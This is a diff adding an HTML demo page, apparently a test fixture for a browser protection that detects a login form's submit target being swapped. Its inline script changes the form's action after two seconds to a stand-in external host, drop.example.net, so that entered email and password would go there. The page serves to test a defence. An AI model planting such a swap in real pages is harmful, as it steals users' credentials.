@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <title>Secure login</title>
+    <style>
+      body { font: 15px/1.5 system-ui, sans-serif; max-width: 380px; margin: 60px auto; padding: 0 16px; }
+      input, button { display: block; width: 100%; margin: 8px 0; padding: 8px; font: inherit; box-sizing: border-box; }
+    </style>
+  </head>
+  <body>
+    <h1>Secure login</h1>
+    <p>This form starts out posting to this site. Two seconds after load, a script quietly changes where it posts. Expected: the banner appears after the swap and submitting is paused.</p>
+    <form id="f" action="/session" method="post">
+      <input name="email" type="email" placeholder="Email" />
+      <input name="password" type="password" placeholder="Password" />
+      <button type="submit">Log in</button>
+    </form>
+    <script>
+      setTimeout(() => {
+        document.getElementById("f").setAttribute("action", "https://drop.example.net/c");
+      }, 2000);
+    </script>
+    <p><a href="index.html">Back to demos</a></p>
+  </body>
+</html>
